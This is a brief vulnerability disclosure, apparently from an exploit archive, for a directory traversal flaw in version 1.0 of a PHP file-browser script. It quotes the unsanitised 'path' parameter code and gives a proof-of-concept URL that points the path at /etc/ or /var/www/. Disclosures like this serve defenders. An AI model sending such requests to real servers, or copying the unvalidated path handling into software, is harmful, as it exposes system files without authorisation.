# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
# Vendor Homepage: https://www.hscripts.com/scripts/php/file-browser.php
# Software Link:https://www.hscripts.com/scripts/php/downloads/file-browser-demo.zip
# Version: 1.0
# Category: Webapps
# Tested on: Kali linux
# Description : The "index.php" is vulnerable to directory traversal.
# An attacker can see and read all files known by the name
 
# Vulnerable File: index.php
<?php // line 45
 
72  $script = basename(__FILE__); // the name of this script
73  $path = !empty($_REQUEST[&#039;path&#039;]) ? $_REQUEST[&#039;path&#039;] : "demo"; // the path the script should access
74
75  if($loc!=&#039;&#039;){
76  echo "<p id=&#039;bloc&#039;><b>Browsing Location: </b><a href=&#039;index.php&#039;><b>".ucfirst($loc1)."</b></a>
77  <a href=&#039;$script?path=$rpath/$loc1/$loc2&#039;><b>".ucfirst($locdem2)."</b></a>
78  <a href=&#039;&#039;><b>".ucfirst($locdem3)."</b></a></p>";}
79  else{
80    echo "<p id=&#039;bloc&#039;><b>Browsing Location: </b><a href=&#039;&#039;><b>Demo</b></a></p>";
 
?> // line 151
 
# PoC :
 
https://Target/scripts/php/file-browser-demo/index.php?path=[DirectoryName]
 
# You can write the known directory name instead of [DirectoryName].
# Example: &#039;/etc/&#039; or &#039;/var/www/&#039;  
# https://Target/scripts/php/file-browser-demo/index.php?path=/etc/

